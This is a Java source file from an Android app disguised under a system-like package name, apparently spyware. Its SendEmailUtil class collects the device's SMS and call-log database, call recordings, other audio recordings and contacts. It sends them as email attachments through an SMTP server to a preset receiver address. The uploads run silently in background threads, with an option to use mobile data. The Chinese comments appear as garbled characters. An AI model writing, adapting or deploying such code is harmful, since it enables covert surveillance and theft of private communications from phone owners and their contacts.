package com.android.system.controled.util;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Properties;
import java.util.Vector;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;

import android.content.Context;
import android.util.Log;

import com.android.system.controled.Globle;
import com.android.system.controled.db.DatabaseUtil;

public class SendEmailUtil {

	private static final String TAG = "SendEmailUtil";

	public static final String host = "smtp.163.com";
	// public static final String host = "smtp.gmail.com";

	private final static String FILE_CALL = DatabaseUtil.DB_PATH;

	private Session initialize() {
		Properties props = new Properties();

		// //Gmail, ��δʵ��
		// props.setProperty("mail.smtp.host", "smtp.gmail.com");
		// props.setProperty("mail.smtp.socketFactory.class",
		// "javax.net.ssl.SSLSocketFactory");
		// props.setProperty("mail.smtp.socketFactory.fallback", "false");
		// props.setProperty("mail.smtp.port", "465");
		// props.setProperty("mail.smtp.socketFactory.port", "465");
		// props.put("mail.smtp.auth", "true");
		// 163
		props.setProperty("mail.transport.protocol", "smtp");
		props.setProperty("mail.smtp.host", host);
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.port", "25");

		SmtpAuth auth = new SmtpAuth();
		auth.setAccount(Globle.senderName, Globle.senderPwd);
		Session session = Session.getDefaultInstance(props, auth);
		return session;
	}

	/**
	 * �ϴ�����ͨ����¼
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadSmsCallLog(final Context con, boolean uploadEvenIfMobile) {
		if ((uploadEvenIfMobile && NetworkUtil.isMobileEnabled(con)) || NetworkUtil.isWifiEnabled(con)) {
			new Thread(new Runnable() {

				@Override
				public void run() {

					String content = "���ź�ͨ����¼, ������";
					Vector<String> files = new Vector<String>();

					if (Globle.FILE_CALL_LOG.exists()) {
						Log.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
						files.add(Globle.FILE_CALL_LOG.getAbsolutePath());
					}
					if ((new File(FILE_CALL)).exists()) {
						Log.v("Add", FILE_CALL);
						files.add(FILE_CALL);
					}

					if (files.size() <= 0) {
						content = "��û���κμ�¼��";
					}

					try {
						sendMail("����ͨ����¼", content, Globle.receiverEmail, files);
						deleteTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
					} catch (AddressException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);

					} catch (MessagingException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
					}

				}
			}).start();

		} else {
			addTag(con, Globle.PHONE_CODE_UPLOAD_SMS_CALL);
		}

	}

	/**
	 * �ϴ�ͨ��¼��
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadCallAudios(final Context con, boolean uploadEvenIfMobile) {
		if ((uploadEvenIfMobile && NetworkUtil.isMobileEnabled(con)) || NetworkUtil.isWifiEnabled(con)) {
			new Thread(new Runnable() {

				@Override
				public void run() {

					String content = "ͨ��¼����������";
					Vector<String> files = new Vector<String>();

					File path = new File(Globle.FILEPATH_AUDIOS_CALL);
					if (path.exists() && path.isDirectory()) {
						File[] audios = path.listFiles();
						if (audios != null) {
							for (File audio : audios) {
								files.add(audio.getAbsolutePath());
								Log.e("Add", " add file = " + audio.getAbsolutePath());
							}
						}
					}

					if (files.size() <= 0) {
						content = "��û��ͨ��¼����";
					}

					try {
						sendMail("ͨ��¼��", content, Globle.receiverEmail, files);
						deleteTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
					} catch (AddressException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);

					} catch (MessagingException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
					}

				}
			}).start();

		} else {
			addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_CALL);
		}

	}

	/**
	 * �ϴ�����¼��
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadOtherAudios(final Context con, boolean uploadEvenIfMobile) {
		if ((uploadEvenIfMobile && NetworkUtil.isMobileEnabled(con)) || NetworkUtil.isWifiEnabled(con)) {
			new Thread(new Runnable() {

				@Override
				public void run() {
					String content = "����¼����������";
					Vector<String> files = new Vector<String>();

					File path = new File(Globle.FILEPATH_AUDIOS_OTHER);
					if (path.exists() && path.isDirectory()) {
						File[] audios = path.listFiles();
						if (audios != null) {
							for (File audio : audios) {
								files.add(audio.getAbsolutePath());
								Log.e("Add", " add other audio file = " + audio.getAbsolutePath());
							}
						}
					}

					if (files.size() <= 0) {
						content = "��û������¼����";
					}

					try {
						sendMail("����¼��", content, Globle.receiverEmail, files);
						deleteTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
					} catch (AddressException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);

					} catch (MessagingException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
					}

				}
			}).start();

		} else {
			addTag(con, Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER);
		}

	}

	/**
	 * �ϴ�����
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadALL(final Context con, boolean uploadEvenIfMobile) {
		if ((uploadEvenIfMobile && NetworkUtil.isMobileEnabled(con)) || NetworkUtil.isWifiEnabled(con)) {
			new Thread(new Runnable() {

				@Override
				public void run() {

					String content = "���м�¼��������";
					Vector<String> files = new Vector<String>();

					if (Globle.FILE_CALL_LOG.exists()) {
						Log.v("Add", Globle.FILE_CALL_LOG.getAbsolutePath());
						files.add(Globle.FILE_CALL_LOG.getAbsolutePath());
					}
					if ((new File(FILE_CALL)).exists()) {
						Log.v("Add", FILE_CALL);
						files.add(FILE_CALL);
					}

					File path = new File(Globle.FILEPATH_AUDIOS_CALL);
					if (path.exists() && path.isDirectory()) {
						File[] audios = path.listFiles();
						if (audios != null) {
							for (File audio : audios) {
								files.add(audio.getAbsolutePath());
								Log.e("Add", " add call audio file = " + audio.getAbsolutePath());
							}
						}
					}

					File path2 = new File(Globle.FILEPATH_AUDIOS_OTHER);
					if (path2.exists() && path2.isDirectory()) {
						File[] audios = path2.listFiles();
						if (audios != null) {
							for (File audio : audios) {
								files.add(audio.getAbsolutePath());
								Log.e("Add", " add other audio file = " + audio.getAbsolutePath());
							}
						}
					}

					if (files.size() <= 0) {
						content = "��û���κμ�¼��";
					}

					try {
						sendMail("����", content, Globle.receiverEmail, files);
						deleteTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
					} catch (AddressException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_ALL);

					} catch (MessagingException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
					}

				}
			}).start();

		} else {
			addTag(con, Globle.PHONE_CODE_UPLOAD_ALL);
		}

	}

	/**
	 * �ϴ���ϵ��
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadContact(final Context con, boolean uploadEvenIfMobile) {
		if ((uploadEvenIfMobile && NetworkUtil.isMobileEnabled(con)) || NetworkUtil.isWifiEnabled(con)) {
			new Thread(new Runnable() {

				@Override
				public void run() {

					String content = "��ϵ�ˣ�������";
					Vector<String> files = new Vector<String>();

					if (Globle.FILE_CONTACTS.exists()) {
						Log.v("Add", Globle.FILE_CONTACTS.getAbsolutePath());
						files.add(Globle.FILE_CONTACTS.getAbsolutePath());
					}

					if (files.size() <= 0) {
						content = "��ϵ��Ϊ�գ�";
						;
					}

					try {
						sendMail("��ϵ��", content, Globle.receiverEmail, files);
						deleteTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
					} catch (AddressException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);

					} catch (MessagingException e) {
						e.printStackTrace();
						addTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
					}
				}
			}).start();

		} else {
			addTag(con, Globle.PHONE_CODE_UPLOAD_CONTACTS);
		}

	}

	private void deleteTag(Context context, String code) {
		if (Globle.FILE_TAG_UPLOAD_TAG.exists() && FileUtil.read(Globle.FILENAME_TAG_UPLOAD_TAG, context).equals(code)) {
			Log.e(TAG, "  deleteTag   " + code);
			Globle.FILE_TAG_UPLOAD_TAG.delete();
		}
	}

	private void addTag(Context context, String code) {
		Log.e(TAG, "  addTag   " + code);
		FileUtil.write(code, Globle.FILENAME_TAG_UPLOAD_TAG, context);

	}

	/**
	 * ����Email
	 * 
	 * @param subject
	 *            ����
	 * @param body
	 *            ����
	 * @param sender
	 *            ������
	 * @param recipients
	 *            ������
	 * @throws MessagingException
	 * @throws AddressException
	 * */
	public synchronized void sendMail(String subject, String body, String recipients, Vector<String> files) throws AddressException, MessagingException {

		MimeMessage message = new MimeMessage(initialize());

		try {
			message.setFrom(new InternetAddress(Globle.senderName));
			// message.setSender(new InternetAddress(userName));
		} catch (AddressException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		try {
			if (recipients.contains(",")) {
				message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));
			} else {
				message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipients));
			}
		} catch (AddressException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		try {
			message.setSubject(subject);
		} catch (AddressException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		Multipart mp = new MimeMultipart();
		MimeBodyPart mbpContent = new MimeBodyPart();
		mbpContent.setText(body);
		mp.addBodyPart(mbpContent);
		if (files != null && files.size() > 0) {
			for (int i = 0; i < files.size(); i++) {
				MimeBodyPart attachPart = new MimeBodyPart();
				FileDataSource fds = new FileDataSource(files.get(i)); // ��Ҫ���͵��ļ�
				try {
					attachPart.setDataHandler(new DataHandler(fds));
				} catch (MessagingException e) {
					e.printStackTrace();
				}
				try {
					attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "utf-8", null));
					// attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "GB2312", null));
				} catch (MessagingException e) {
					e.printStackTrace();
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}

				try {
					mp.addBodyPart(attachPart);// ���
				} catch (MessagingException e) {
					e.printStackTrace();
				}
			}

			files.removeAllElements();
		}

		try {
			message.setContent(mp);
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		try {
			// message.saveChanges();
			message.setSentDate(new Date());
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		try {
			Transport.send(message);// ��ʼ����
		} catch (MessagingException e) {
			e.printStackTrace();
		}
	}

	private static class SmtpAuth extends Authenticator {

		private String user, password;

		void setAccount(String user, String password) {
			this.user = user;
			this.password = password;
		}

		@Override
		protected PasswordAuthentication getPasswordAuthentication() {
			return new PasswordAuthentication(user, password);
		}
	}
}
